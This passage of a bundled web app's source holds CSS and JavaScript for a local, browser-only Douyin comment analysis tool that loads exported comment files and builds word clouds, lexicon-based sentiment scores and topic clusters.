{\n  .grid { grid-template-columns: minmax(0, 1fr) 360px; }\n  .cloud { min-height: clamp(420px, 46vh, 560px); }\n}\n/* 减少动效 */\n@media (prefers-reduced-motion: reduce) {\n  *, *::before, *::after {\n    animation-duration: .001s !important;\n    animation-iteration-count: 1 !important;\n    transition-duration: .001s !important;\n    scroll-behavior: auto !important;\n  }\n}\n\n/* v4.0 细节：窄屏评论表用两列网格 —— 文字/用户整行，元信息两列并排，单条不再过高 */\n@media (max-width: 620px) {\n  #table tbody tr {\n    display: grid;\n    grid-template-columns: repeat(2, minmax(0, 1fr));\n    gap: 2px 10px;\n    padding: 12px 12px 10px;\n  }\n  #table tbody td.cell-text { grid-column: 1 / -1; padding-bottom: 4px; }\n  #table tbody td[data-label=\"用户\"] { grid-column: 1 / -1; padding-bottom: 2px; }\n  #table tbody td { padding: 2px 0; }\n  #table tbody td::before { flex: 0 0 44px; }\n}\n\n/* v0.5.51：洞察卡片等高——卡片内竖向弹性，主题列表与左侧「地域分布」同高、超出在卡片内滚动 */\n.insight-card { display: flex; flex-direction: column; }\n.insight-card .insight-body { flex: 1 1 auto; min-width: 0; }\n.insight-card.topic-card .insight-body { min-height: 0; overflow-y: auto; overscroll-behavior: contain; padding-right: 4px; }\n.insight-card.topic-card .insight-body::-webkit-scrollbar { width: 8px; }\n.insight-card.topic-card .insight-body::-webkit-scrollbar-thumb { background: var(--line-strong); border-radius: 4px; }\n@media (max-width: 700px) {\n  .insight-card.topic-card .insight-body { max-height: none !important; overflow-y: visible; }\n}\n", // 词云页 styles.css
  js: "/* 评论分析台 · 词云 + 评论表（纯前端，无依赖）\n * 数据来源：抖音评论采集插件/扩展导出的 JSON / CSV（可整目录批量载入）\n * 隐私：全部在本机浏览器内处理，不发任何网络请求\n */\n(function () {\n  'use strict';\n\n  /* ===================== 工具 ===================== */\n  const $ = (sel, root) => (root || document).querySelector(sel);\n  const $$ = (sel, root) => Array.from((root || document).querySelectorAll(sel));\n  const PROFILE_BASE = 'https://www.douyin.com/user/';\n\n  const esc = (s) => String(s == null ? '' : s)\n    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;').replace(/'/g, '&#39;');\n\n  const fmtNum = (n) => {\n    n = Number(n) || 0;\n    if (n >= 100000000) return (n / 100000000).toFixed(1).replace(/\\.0$/, '') + ' 亿';\n    if (n >= 10000) return (n / 10000).toFixed(1).replace(/\\.0$/, '') + ' 万';\n    return String(n);\n  };\n\n  const pad2 = (n) => (n < 10 ? '0' + n : String(n));\n  const fmtTime = (ts) => {\n    if (!ts) return '';\n    const d = new Date(Number(ts) * (String(ts).length > 10 ? 1 : 1000));\n    if (isNaN(d.getTime())) return '';\n    return `${d.getFullYear()}-${pad2(d.getMonth() + 1)}-${pad2(d.getDate())} ${pad2(d.getHours())}:${pad2(d.getMinutes())}`;\n  };\n  const fmtTimeShort = (ts) => {\n    const s = fmtTime(ts);\n    return s ? s.slice(5) : '';\n  };\n\n  const profileOf = (user) => {\n    const sec = user && user.secUid ? String(user.secUid).trim() : '';\n    return sec ? PROFILE_BASE + encodeURIComponent(sec) : '';\n  };\n\n  const videoUrl = (videoId) => {\n    const id = String(videoId || '').trim();\n    if (!id) return '';\n    const v = state.videos.get(id);\n    if (v && v.url) return v.url;\n    return 'https://www.douyin.com/video/' + encodeURIComponent(id);\n  };\n\n  let toastTimer = null;\n  function toast(msg) {\n    const el = $('#toast');\n    el.textContent = msg;\n    el.classList.remove('hidden');\n    clearTimeout(toastTimer);\n    toastTimer = setTimeout(() => el.classList.add('hidden'), 2200);\n  }\n\n  function debounce(fn, ms) {\n    let t = null;\n    return function () {\n      const args = arguments, self = this;\n      clearTimeout(t);\n      t = setTimeout(() => fn.apply(self, args), ms);\n    };\n  }\n\n  const initials = (name) => {\n    const s = String(name || '').trim();\n    if (!s) return '?';\n    return s.slice(0, 1).toUpperCase();\n  };\n\n  // 每个用户一个稳定的淡色头像底（按昵称/ID 散列取色），只用淡色、不参与数据配色\n  const avatarHue = (user) => {\n    const key = String((user && (user.secUid || user.uid || user.nickname)) || '');\n    let h = 0;\n    for (let i = 0; i < key.length; i++) h = (h * 31 + key.charCodeAt(i)) % 360;\n    return h;\n  };\n  const avatarStyle = (user) => {\n    const h = avatarHue(user);\n    return `background:hsl(${h} 16% 18%);color:hsl(${h} 30% 78%)`;\n  };\n\n  /* ===================== 状态 ===================== */\n  const state = {\n    comments: [],              // 全部评论（已归一化、已去重）\n    videos: new Map(),         // videoId -> { id, title, url, collectedAt }\n    sources: [],               // 已载入文件名\n    filters: { videoId: '', search: '', onlyHasProfile: false, onlyTopLevel: false, onlyNonEmpty: false, onlyContent: true, sentiment: '', topic: '' },\n    topics: [],                // v3.0：主题聚类结果（TF-IDF + k-means）\n    topicBusy: false,\n    kwKeep: [],               // v0.5.41：自定义加词（长词优先，避免被切碎）\n    kwBlock: [],              // v0.5.41：自定义屏蔽词\n    sort: 'digg',\n    page: 1,\n    pageSize: 50,\n    words: [],\n    wordMap: new Map(),        // word -> { word, count, cids:Set }\n    lastWord: '',\n    cloudReady: false,\n    hoverWord: '',\n  };\n\n  /* v0.5.41：自定义加词 / 屏蔽词存在 localStorage（只在本机，不上传） */\n  try {\n    state.kwKeep = JSON.parse(localStorage.getItem('cw.kw.keep') || '[]') || [];\n    state.kwBlock = JSON.parse(localStorage.getItem('cw.kw.block') || '[]') || [];\n  } catch (e) { state.kwKeep = []; state.kwBlock = []; }\n\n  /* ===================== CSV 解析 ===================== */\n  function parseCsv(text) {\n    text = String(text || '').replace(/^\\uFEFF/, '');\n    const rows = [];\n    let row = [], field = '', inQuotes = false;\n    for (let i = 0; i < text.length; i++) {\n      const ch = text[i];\n      if (inQuotes) {\n        if (ch === '\"') {\n          if (text[i + 1] === '\"') { field += '\"'; i++; }\n          else inQuotes = false;\n        } else field += ch;\n      } else if (ch === '\"') {\n        inQuotes = true;\n      } else if (ch === ',') {\n        row.push(field); field = '';\n      } else if (ch === '\\r') {\n        if (text[i + 1] === '\\n') i++;\n        row.push(field); field = '';\n        rows.push(row); row = [];\n      } else if (ch === '\\n') {\n        row.push(field); field = '';\n        rows.push(row); row = [];\n      } else field += ch;\n    }\n    if (field.length || row.length) { row.push(field); rows.push(row); }\n    // 去掉首格为 # 的中文说明行 / 空行\n    return rows.filter((r) => {\n      if (!r.length) return false;\n      const first = String(r[0] == null ? '' : r[0]).trim();\n      if (first.startsWith('#')) return false;\n      if (r.every((c) => String(c == null ? '' : c).trim() === '')) return false;\n      return true;\n    });\n  }\n\n  function num(v) { const n = Number(String(v == null ? '' : v).trim()); return isFinite(n) ? n : 0; }\n\n  /* ===================== 归一化 ===================== */\n  function normalizeUser(u) {\n    u = u || {};\n    return {\n      nickname: String(u.nickname || '').trim() || '匿名用户',\n      uid: u.uid ? String(u.uid) : '',\n      secUid: u.sec_uid ? String(u.sec_uid) : (u.secUid ? String(u.secUid) : ''),\n      uniqueId: u.unique_id ? String(u.unique_id) : (u.uniqueId ? String(u.uniqueId) : ''),\n      shortId: u.short_id ? String(u.short_id) : (u.shortId ? String(u.shortId) : ''),\n    };\n  }\n\n  // v2.4：导出数据本来就带清洗后的文本（`text_clean`，去表情/@/#，扩展的 cleanText() 生成）。\n  // 分词优先用它；老数据/快照没有该字段时，再在 tokensOf() 里剥 [表情] 兜底。\n  function cleanForTokens(raw, text) {\n    const cleaned = String(raw.text_clean != null ? raw.text_clean : (raw.textClean != null ? raw.textClean : '')).trim();\n    if (cleaned) return cleaned;\n    return String(text || '');\n  }\n\n  function normalizeComment(raw, meta) {\n    raw = raw || {};\n    const text = String(raw.text != null ? raw.text : (raw.text_clean || raw.content || '')).trim();\n    const cid = String(raw.cid || raw.comment_id || '');\n    const user = normalizeUser(raw.user || {\n      nickname: raw.user_nickname, uid: raw.user_uid, sec_uid: raw.user_sec_uid,\n      unique_id: raw.user_unique_id, short_id: raw.user_short_id,\n    });\n    const videoId = String(raw.videoId || raw.video_id || meta.videoId || '');\n    return {\n      cid,\n      videoId,\n      videoTitle: meta.title || '',\n      text,\n      textClean: cleanForTokens(raw, text),\n      digg: num(raw.digg_count != null ? raw.digg_count : raw.digg),\n      replies: num(raw.reply_comment_total != null ? raw.reply_comment_total : raw.replies),\n      ip: String(raw.ip_label || ''),\n      createTime: num(raw.create_time),\n      createTimeStr: String(raw.create_time_str || fmtTime(raw.create_time) || ''),\n      isReply: raw.is_reply === true || String(raw.is_reply) === '1' || String(raw.is_reply).toLowerCase() === 'true' || num(raw.level) > 1,\n      level: num(raw.level) || 1,\n      isHot: raw.is_hot === true || String(raw.is_hot) === '1',\n      isFolded: raw.is_folded === true || String(raw.is_folded) === '1',\n      user,\n    };\n  }\n\n  /* ===================== 载入数据 ===================== */\n  function addComments(list) {\n    let added = 0;\n    const seen = new Set(state.comments.map((c) => c.videoId + '|' + c.cid));\n    for (const c of list) {\n      if (!c.text && !c.user.nickname) continue;\n      const key = c.videoId + '|' + c.cid;\n      if (c.cid && seen.has(key)) continue;\n      seen.add(key);\n      state.comments.push(c);\n      added++;\n    }\n    return added;\n  }\n\n  function ingestJson(text, fileName) {\n    let obj;\n    try { obj = JSON.parse(String(text).replace(/^\\uFEFF/, '')); }\n    catch (e) { toast('JSON 解析失败：' + fileName); return -1; }\n    let arr = null, meta = { videoId: '', title: '' };\n    if (Array.isArray(obj)) arr = obj;\n    else if (obj && Array.isArray(obj.comments)) {\n      arr = obj.comments;\n      meta.videoId = String(obj.videoId || obj.video_id || '');\n      meta.title = String(obj.title || '');\n    } else if (obj && obj.data && Array.isArray(obj.data.comments)) {\n      arr = obj.data.comments;\n    }\n    if (!arr) { toast('这个 JSON 里没有 comments 数组：' + fileName); return -1; }\n    if (meta.videoId) {\n      state.videos.set(meta.videoId, {\n        id: meta.videoId, title: meta.title || '视频 ' + meta.videoId.slice(-8),\n        url: obj.url || ('https://www.douyin.com/video/' + meta.videoId),\n        collectedAt: obj.collectedAt || '',\n      });\n    }\n    const list = arr.map((c) => normalizeComment(c, meta));\n    return addComments(list);\n  }\n\n  function ingestCsv(text, fileName) {\n    const rows = parseCsv(text);\n    if (!rows.length) { toast('CSV 是空的：' + fileName); return -1; }\n    const header = rows[0].map((h) => String(h || '').trim());\n    const idx = {};\n    header.forEach((h, i) => { idx[h] = i; });\n    if (idx.cid == null && idx.text == null) { toast('这不是评论导出 CSV：' + fileName); return -1; }\n    const hasVideoCol = idx.video_id != null;\n    let curMeta = { videoId: '', title: '' };\n    if (!hasVideoCol) {\n      // 单视频 CSV：从文件名里取 videoId\n      const m = String(fileName || '').match(/(\\d{15,25})/);\n      if (m) {\n        curMeta.videoId = m[1];\n        if (!state.videos.has(m[1])) {\n          state.videos.set(m[1], { id: m[1], title: '视频 ' + m[1].slice(-8), url: 'https://www.douyin.com/video/' + m[1], collectedAt: '' });\n        }\n      }\n    }\n    const get = (r, key) => (idx[key] != null ? r[idx[key]] : '');\n    const list = [];\n    for (let i = 1; i < rows.length; i++) {\n      const r = rows[i];\n      const vid = hasVideoCol ? String(get(r, 'video_id') || '').trim() : curMeta.videoId;\n      if (hasVideoCol && vid && !state.videos.has(vid)) {\n        state.videos.set(vid, { id: vid, title: '视频 ' + vid.slice(-8), url: 'https://www.douyin.com/video/' + vid, collectedAt: '' });\n      }\n      const meta = { videoId: vid, title: (state.videos.get(vid) || {}).title || '' };\n      list.push(normalizeComment({\n        cid: get(r, 'cid'),\n        text: get(r, 'text') || get(r, 'text_clean'),\n        text_clean: get(r, 'text_clean'),\n        digg_count: get(r, 'digg_count'),\n        reply_comment_total: get(r, 'reply_comment_total'),\n        ip_label: get(r, 'ip_label'),\n        create_time: get(r, 'create_time'),\n        create_time_str: get(r, 'create_time_str'),\n        is_reply: get(r, 'is_reply'),\n        level: get(r, 'level'),\n        is_hot: get(r, 'is_hot'),\n        is_folded: get(r, 'is_folded'),\n        user_nickname: get(r, 'user_nickname'),\n        user_uid: get(r, 'user_uid'),\n        user_sec_uid: get(r, 'user_sec_uid'),\n        user_unique_id: get(r, 'user_unique_id'),\n        user_short_id: get(r, 'user_short_id'),\n      }, meta));\n    }\n    return addComments(list);\n  }\n\n  async function loadFiles(fileList) {\n    const files = Array.from(fileList || []).filter((f) => /\\.(json|csv)$/i.test(f.name));\n    if (!files.length) { toast('没有找到 .json / .csv 文件'); return; }\n    setLoading(true);\n    let total = 0;\n    const names = [];\n    for (const f of files) {\n      try {\n        const text = await f.text();\n        const n = /\\.json$/i.test(f.name) ? ingestJson(text, f.name) : ingestCsv(text, f.name);\n        if (n >= 0) {\n          total += n;\n          names.push(f.name);\n        }\n      } catch (e) {\n        console.warn('读取失败', f.name, e);\n      }\n    }\n    state.sources = state.sources.concat(names);\n    updateScope();\n    updateEmptyState();\n    $('#btnClear').disabled = state.comments.length === 0;\n    if (total > 0) toast(`载入 ${total} 条评论（${names.length} 个文件）`);\n    else toast('没有新增评论（可能是重复文件）');\n    setLoading(false);\n    refreshAll();\n  }\n\n  /* ===================== 过滤 ===================== */\n  function filtered() {\n    const f = state.filters;\n    const q = f.search.trim().toLowerCase();\n    return state.comments.filter((c) => {\n      if (f.videoId && c.videoId !== f.videoId) return false;\n      if (f.onlyHasProfile && !profileOf(c.user)) return false;\n      if (f.onlyTopLevel && c.isReply) return false;\n      if (f.onlyNonEmpty && !c.text) return false;\n      // v3.0：情感 / 主题筛选（主题由 baseFiltered 的聚类结果给出，避免自我循环）\n      if (f.sentiment && ((c.sentiment && c.sentiment.label) || 'neu') !== f.sentiment) return false;\n      if (f.topic !== '' && f.topic != null && String(c.topic == null ? -1 : c.topic) !== String(f.topic)) return false;\n      if (q) {\n        const hay = (c.text + ' ' + c.user.nickname + ' ' + c.user.uniqueId + ' ' + c.ip).toLowerCase();\n        if (hay.indexOf(q) === -1) return false;\n      }\n      return true;\n    });\n  }\n\n  // v3.0：不含情感/主题的“基础筛选”，主题聚类与洞察面板都基于它，避免筛选后主题编号漂移\n  function baseFiltered() {\n    const savedS = state.filters.sentiment, savedT = state.filters.topic;\n    state.filters.sentiment = ''; state.filters.topic = '';\n    const out = filtered();\n    state.filters.sentiment = savedS; state.filters.topic = savedT;\n    return out;\n  }\n\n  /* ===================== 分词 ===================== */\n  const STOPWORDS = new Set((\n    '的 了 是 在 我 你 他 她 它 们 这 那 有 和 就 都 也 又 还 要 会 能 可以 不是 没有 一个 这个 那个 ' +\n    '什么 怎么 为什么 因为 所以 但是 然后 而且 如果 就是 这样 那样 这么 那么 自己 我们 你们 他们 ' +\n    '她们 它们 人家 别人 大家 真的 真是 确实 其实 应该 可能 觉得 感觉 知道 看到 看过 听到 时候 ' +\n    '现在 之前 以后 一样 一直 已经 还是 只是 不过 有点 一点 一些 这些 那些 多少 几个 一次 一下 ' +\n    '评论 回复 视频 抖音 作者 楼主 主播 up 啊 吧 呢 吗 呀 哦 嗯 哈 啦 嘛 哇 呵 嘿 诶 哎 唉 么 ' +\n    '哇塞 哈哈哈 哈哈哈哈 呵呵 嘿嘿 666 233 999 111 1111 2333 555 干嘛 咋 咱 俺 啥 嘞 咯 嗷 呜 喵 ' +\n  '必须 直接 肯定 一定 主要 以及 中的 的话 之类 等等 以为 希望 想要 需要 为了 要是 还有 才有 都要 没了 不对 一句 一段 一眼 看完 出来 上去 下去 起来 下来 过去 回去 以前 之后 刚才 马上 立刻 终于 甚至 反而 竟然 居然 果然 依然 仍然 偶尔 总是 经常 有时 从来 一向 还要 会不会 能不能 是不是 有没有 怎么办 怎么样 什么时候 干什么 什么样 什么的 或者 来说 来讲 似的 一般 差不多 一会 一下 一起 这种 那种 哪种 各种 这种 都是 才是 也是 还是 只是 就是 而是 于是 但是 可是 因此 所以 如果 虽然 不管 无论 即使 尽管 只要 只有 除了 关于 对于 由于 按照 根据 通过 经过 沿着 随着 直到 等到'\n  ).split(/\\s+/).filter(Boolean));\n\n  /* v0.5.41：按社区做法（jieba 系 + 中文停用词四表的口径）补齐常见泛词，\n   * 让「真的 / 感觉 / 很多 / 这种 / 都是」这类词在词云里自然消失。 */\n  for (const w of (\n    '真的 感觉 觉得 知道 认为 以为 希望 想要 需要 应该 必须 一定 肯定 估计 可能 或许 大概 差不多 几乎 简直 实在 确实 其实 本来 原来 果然 竟然 居然 反而 甚至 尤其 特别 非常 十分 相当 比较 稍微 略微 更加 越来越 太多 好多 很多 不少 有些 挺多 一堆 一大 全都 全部 整个 所有 每个 任何 某些 其他 其它 剩下 别的 另外 此外 而且 并且 或者 还不如 不如 要不 不然 否则 因此 所以 于是 然后 接着 随后 最后 首先 其次 总之 反正 究竟 到底 毕竟 何况 况且 再说 至于 关于 对于 根据 按照 依照 通过 经过 凭借 由于 因为 为了 除了 除非 即使 即便 哪怕 无论 不管 不论 只要 虽然 尽管 但是 可是 不过 然而 只是 就算 如果 要是 假如 万一 一旦 直到 等到 每当 之前 之后 以前 以后 现在 目前 当时 那时 这时 此时 同时 立刻 马上 立即 刚刚 刚才 已经 曾经 从来 一向 一直 始终 总是 经常 常常 时常 有时 偶尔 很少 从不 再次 重新 继续 仍然 依然 依旧 仍旧 还要 还没 还没有 不用 不要 不能 不会 不敢 不想 不需要 说不定 不一定 不可能 不错 不好 好看 不起 老是 不知道 不打 还好 好听 好玩 可爱 漂亮 厉害 牛逼 牛批 牛皮 离谱 逆天 绝了 完了 笑死 笑了 感动 无语 服了 麻了 破防 上头 东西 事情 时候 时间 地方 方式 方法 方面 问题 情况 样子 意思 内容 部分 结果 原因 感觉 心里 希望 想法 办法 事情 过程 水平 大家 大家伙 各位 咱们 我们 你们 他们 她们 它们 自己 别人 人家 有人 没人 谁都 什么 啥 咋 咋样 怎么办 怎么样 什么样 为什么 为啥 什么时候 哪里 哪儿 这里 那里 这边 那边 这样 那样 这么 那么 这种 那种 哪种 这些 那些 哪些 这个 那个 哪个 一次 一下 一会 一起 一直 一边 一样 一般 一致 一切 一共 一点 一半 一天 一年 一句 一段 一条 一遍 一层 一群 一批 一部分 一方面 双方 彼此 互相 相互 各种 各自 每次 每天 每年 某个 某些 是不是 有没有 要不要 会不会 能不能 对不对 好不好 行不行 可不可以 有没有人 我说 你说 他说 她说 我说真的 我觉 你们觉得 我觉得 说实话 说真的 说白了 换句话说 也就是 也就是说 也就是说 另一方面 与此同时 除此之外 不仅如此 由此可见 总的来说 简单说 总之 唉 哎 哎呀 哎哟 天哪 天啊 我的天 妈呀 卧槽 我靠 哈哈哈 哈哈 呵呵 嘿嘿 嘻嘻 么么 哇哦 嗯嗯 对对 好好 是是 行行 可以可以 谢谢 感谢 多谢 辛苦 支持 关注 收藏 转发 分享 弹幕 直播 主播 作者 楼主 老铁 兄弟 姐姐 哥哥 妹妹 弟弟 朋友 视频 评论 回复 点赞 投币 三连 关注了 已关注 取关 前排 沙发 板凳 路过 打卡 签到 首次 第一次 上次 下次 这次 那次 刚才 刚刚 突然 忽然 立刻 最终 终于 好像 似乎 显然 明显 确实 的确 真的 真是 简直 完全 全部 整体 总体'\n  ).split(/\\s+/)) if (w) STOPWORDS.add(w);\n\n  /* v0.5.40：只看虚词字符组成的词直接丢掉（都是 / 这种 / 我的 / 出来 / 中的…）。\n   * 依据是「实词至少有一个非虚词字符」，这样不用维护几千条停用词也能过滤掉大部分口头词。 */\n  const FUNCTION_CHARS = new Set(('的是我你他她它们这那个也就都还又和与在有不会能可要什么怎样些点时候一二三不没很太更最对错上下中内外到说看想做去来出进过回从被把给跟于为以因此所以就而且并且但是然后如果虽然不过只是当然因为所以着了吧呢吗啊呀哦嗯啦嘛哇种才里完句直真错对同再又').split(''));\n  function isFunctionOnly(t) {\n    for (const ch of t) if (!FUNCTION_CHARS.has(ch)) return false;\n    return true;\n  }\n\n  let segmenter = null;\n  try {\n    if (typeof Intl !== 'undefined' && Intl.Segmenter) segmenter = new Intl.Segmenter('zh-Hans', { granularity: 'word' });\n  } catch (e) { segmenter = null; }\n\n  function tokensOf(text) {\n    const out = [];\n    // v2.3：抖音表情是 [憨笑] [流泪] 这种方括号标签文本，直接分词会把标签名当成词（点进去只有一条「[悲伤]」）。\n    // 分词前先把方括号标签剥掉，纯表情评论因此不贡献任何关键词。\n    const s = String(text || '').replace(/\\[[^\\[\\]]{1,12}\\]/g, ' ');\n    if (!s.trim()) return out;\n    if (segmenter) {\n      for (const seg of segmenter.segment(s)) {\n        if (!seg.isWordLike) continue;\n        out.push(seg.segment);\n      }\n    } else {\n      // 兜底：中文取 2-gram，英文/数字按词\n      const parts = s.match(/[A-Za-z][A-Za-z0-9'+.-]*|\\d+(?:\\.\\d+)?|[\\u4e00-\\u9fff]+/g) || [];\n      for (const p of parts) {\n        if (/^[\\u4e00-\\u9fff]+$/.test(p)) {\n          if (p.length === 1) out.push(p);\n          else for (let i = 0; i + 2 <= p.length; i++) out.push(p.slice(i, i + 2));\n        } else out.push(p);\n      }\n    }\n    // v0.5.41：自定义加词——Intl.Segmenter 没有词典，会把「酒池肉林」切成「酒池 / 肉林」，\n    // 用户把整词加进来后，只要原文里出现就按整词计一次（每条评论内仍去重）。\n    if (state.kwKeep && state.kwKeep.length) {\n      const low = s.toLowerCase();\n      for (const kw of state.kwKeep) if (kw && low.indexOf(kw) >= 0) out.push(kw);\n    }\n    return out;\n  }\n\n  function cleanToken(w, strict) {\n    let t = String(w || '').trim();\n    if (!t) return '';\n    t = t.replace(/[\\s\\u3000]+/g, '');\n    if (!t) return '';\n    if (/^[\\d.,%+\\-/:]+$/.test(t)) return '';\n    if (/^[A-Za-z]+$/.test(t)) t = t.toLowerCase();\n    if (t.length < 2) return '';\n    if (strict !== false) {\n      if (STOPWORDS.has(t.toLowerCase())) return '';\n      if (isFunctionOnly(t)) return '';      // v0.5.40：这种 / 都是 / 我的 …\n    }\n    if (/^(.)\\1{2,}$/.test(t)) return '';       // 啊啊啊\n    return t;\n  }\n\n  function parseWordList(v) {\n    const out = [];\n    for (const raw of String(v || '').split(/[,，、;；\\s]+/)) {\n      const t = raw.trim().toLowerCase();\n      if (t.length >= 2 && out.indexOf(t) === -1) out.push(t);\n    }\n    return out.slice(0, 200);\n  }\n\n  function applyWordLists() {\n    const keepEl = $('#kwKeep'), blockEl = $('#kwBlock');\n    state.kwKeep = parseWordList(keepEl ? keepEl.value : '');\n    state.kwBlock = parseWordList(blockEl ? blockEl.value : '');\n    try {\n      localStorage.setItem('cw.kw.keep', JSON.stringify(state.kwKeep));\n      localStorage.setItem('cw.kw.block', JSON.stringify(state.kwBlock));\n    } catch (e) {}\n    refreshAll();\n  }\n\n  function buildWords(comments) {\n    const map = new Map();\n    const blockSet = new Set(state.kwBlock || []);\n    const keepSet = new Set(state.kwKeep || []);\n    let docN = 0;\n    for (const c of comments) if (c.text) docN++;\n    for (const c of comments) {\n      if (!c.text) continue;\n      const seen = new Set();\n      for (const raw of tokensOf(c.textClean || c.text)) {\n        const isKeep = keepSet.has(String(raw || '').toLowerCase());\n        const w = isKeep ? String(raw).toLowerCase() : cleanToken(raw, state.filters.onlyContent !== false);\n        if (!w || seen.has(w) || blockSet.has(w)) continue;\n        seen.add(w);\n        let rec = map.get(w);\n        if (!rec) { rec = { word: w, count: 0, weight: 0, ratio: 0, generic: false, cids: new Set(), users: new Set() }; map.set(w, rec); }\n        rec.count++;\n        if (c.cid) rec.cids.add(c.cid);\n        rec.users.add(c.user.secUid || c.user.uid || c.user.nickname);\n      }\n    }\n    // v0.5.41：轻量 IDF（对标 jieba.analyse 的 TF-IDF 思路，但只用本视频语料，不用外部语料）：\n    //   weight = df * log(1 + N / df)，N = 有文字的评论数\n    // 同时把「这条视频里到处都在说」的泛词（df/N > 40% 且样本 ≥ 30 条）直接剔除。\n    const out = [];\n    for (const rec of map.values()) {\n      rec.ratio = docN ? rec.count / docN : 0;\n      rec.weight = rec.count * Math.log(1 + (docN || 1) / Math.max(1, rec.count));\n      rec.generic = docN >= 30 && rec.ratio > 0.4;\n      if (!rec.generic) out.push(rec);\n    }\n    return out.sort((a, b) => b.weight - a.weight || b.count - a.count || a.word.localeCompare(b.word));\n  }\n\n  /* ===================== 情感分析（v3.0） =====================\n   * 纯本地词典法：正向/负向词表（分级权重）+ 程度副词提升 + 否定词翻转 + 抖音表情标签。\n   * 不联网、不调模型，结果可解释；输出挂在评论上：c.sentiment = { score, label, hits }。\n   */\n  const SENT_POS_STRONG = new Set(('太棒 牛逼 绝了 神作 惊艳 完美 精彩 厉害 高能 真香 给力 宝藏 神器 顶 爱了 圈粉 封神 天花板 牛逼克拉斯 大佬 佩服 五体投地 神评 笑死'.split(/\\s+/)));\n  const SENT_POS = new Set(('好 赞 棒 强 牛 喜欢 爱 支持 感谢 感动 治愈 暖心 温柔 靠谱 良心 专业 优秀 燃 爽 香 甜 不错 挺好 蛮好 中肯 客观 理性 真实 实在 清楚 明白 简洁 干净 顺畅 稳定 实用 有用 值得 推荐 安利 好用 期待 开心 快乐 高兴 兴奋 满意 舒服 舒适 好看 好听 好玩 可爱 漂亮 帅 美 有趣 搞笑 好笑 感人 贴心 用心 细致 耐心 认真 高手 内行 尊敬 涨知识 学到 受教 好评 有质感 有诚意 有干货 硬核'.split(/\\s+/)));\n  const SENT_NEG_STRONG = new Set(('垃圾 恶心 恶心人 烂 骗子 欺骗 智障 弱智 傻逼 恶臭 反感 讨厌 恨 愤怒 崩溃 心碎 失望 无语 离谱 逆天 破防 麻了 服了 难受 痛苦 吐了 呕吐 鄙视 白眼 嘲讽 喷 骂 举报 差评 水军 掉粉 取关 别买 不值 退钱 翻车 侮辱 冒犯 恶俗 低俗 割韭菜 智商税 阴阳怪气 洗白 洗地 拉胯 恰饭 硬广'.split(/\\s+/)));\n  const SENT_NEG = new Set(('不行 不好 难看 难听 难受 麻烦 复杂 混乱 卡 卡顿 慢 贵 亏 可惜 遗憾 一般 普通 平庸 老套 套路 水 敷衍 凑数 多余 尬 冷场 叹气 皱眉 害怕 恐怖 吓人 阴影 不适 争议 质疑 反驳 抬杠 双标 强行 尴尬 无聊 拖沓 生气 发怒 差 弱 划水 广告 坑 糊弄 玄学 劝退'.split(/\\s+/)));\n  const SENT_NEGATORS = new Set(('不 没 无 未 别 莫 非 勿 没有 不是 不算 不会 不能 不要 不用 不必 不够 不太 不怎么 没那么'.split(/\\s+/)));\n  const SENT_DEGREE = new Set(('太 很 非常 特别 超 巨 极 真 更 最 十分 相当 格外 尤其 愈发 更加 简直 实在 真是 巨他妈'.split(/\\s+/)));\n  const EMOJI_POS = new Set(('憨笑 微笑 大笑 笑哭 呲牙 偷笑 得意 调皮 酷 比心 鼓掌 加油 玫瑰 爱心 飞吻 抱拳 胜利 强 点赞 撒花 庆祝 耶 亲亲 害羞 愉快 色 吃瓜 调皮'.split(/\\s+/)));\n  const EMOJI_NEG = new Set(('流泪 大哭 崩溃 发怒 生气 鄙视 白眼 呕吐 敲打 菜刀 心碎 失望 无语 裂开 叹气 皱眉 骷髅 害怕 惊恐 再见 弱 尬 汗 擦汗 抠鼻 黑线 委屈 可怜 抓狂 咒骂 闭嘴 哼 怒 困'.split(/\\s+/)));\n\n  const EMOJI_TAG_RE = /\\[[^\\[\\]]{1,12}\\]/g;\n\n  function sentimentOf(text) {\n    const raw = String(text || '');\n    let score = 0;\n    let emoHits = 0;\n    const tags = raw.match(EMOJI_TAG_RE) || [];\n    for (const t of tags) {\n      const name = t.slice(1, -1);\n      if (EMOJI_POS.has(name)) { score += 1.2; emoHits++; }\n      else if (EMOJI_NEG.has(name)) { score -= 1.2; emoHits++; }\n    }\n    const s = raw.replace(EMOJI_TAG_RE, ' ').replace(/@[^\\s@]+|#[^\\s#]+/g, ' ');\n    if (!s.trim()) {\n      const norm0 = Math.tanh(score / 2);\n      return { score: Math.round(norm0 * 100) / 100, label: norm0 > 0.15 ? 'pos' : (norm0 < -0.15 ? 'neg' : 'neu'), hits: emoHits };\n    }\n    const toks = [];\n    if (segmenter) for (const seg of segmenter.segment(s)) if (seg.isWordLike) toks.push(seg.segment);\n    else for (const p of s.match(/[A-Za-z][A-Za-z0-9']*|[\\u4e00-\\u9fff]{1,4}/g) || []) toks.push(p);\n    let hits = 0;\n    for (let i = 0; i < toks.length; i++) {\n      const t = toks[i];\n      let base = 0;\n      if (SENT_POS_STRONG.has(t)) base = 2;\n      else if (SENT_POS.has(t)) base = 1;\n      else if (SENT_NEG_STRONG.has(t)) base = -2;\n      else if (SENT_NEG.has(t)) base = -1;\n      if (!base) continue;\n      let mult = 1;\n      for (let j = Math.max(0, i - 2); j < i; j++) {\n        if (SENT_DEGREE.has(toks[j])) mult *= 1.5;\n        if (SENT_NEGATORS.has(toks[j])) mult *= -0.8;\n      }\n      score += base * mult;\n      hits++;\n    }\n    const norm = Math.tanh(score / 2);\n    return {\n      score: Math.round(norm * 100) / 100,\n      label: norm > 0.15 ? 'pos' : (norm < -0.15 ? 'neg' : 'neu'),\n      hits: hits + emoHits,\n    };\n  }\n\n  function annotateSentiment(list) {\n    for (const c of list) if (!c.sentiment) c.sentiment = sentimentOf(c.text);\n  }\n\n  const SENT_LABEL = { pos: '正向', neu: '中性', neg: '负向' };\n\n  function sentimentStats(list) {\n    const s = { pos: 0, neu: 0, neg: 0 };\n    for (const c of list) {\n      const l = (c.sentiment && c.sentiment.label) || 'neu';\n      s[l] = (s[l] || 0) + 1;\n    }\n    return s;\n  }\n\n  /* ===================== 主题聚类（v3.0） =====================\n   * TF-IDF + 轻量 k-means（确定性种子：等距取 k 篇当初始中心），纯前端、无依赖。\n   * 输出 state.topics = [{ id, label, terms, count, reps:[comment] }]，评论上挂 c.topic。\n   */\n  function buildTopics(list) {\n    const docs = [];\n    for (const c of list) {\n      if (!c.text) continue;\n      const seen = new Set();\n      const toks = [];\n      for (const raw 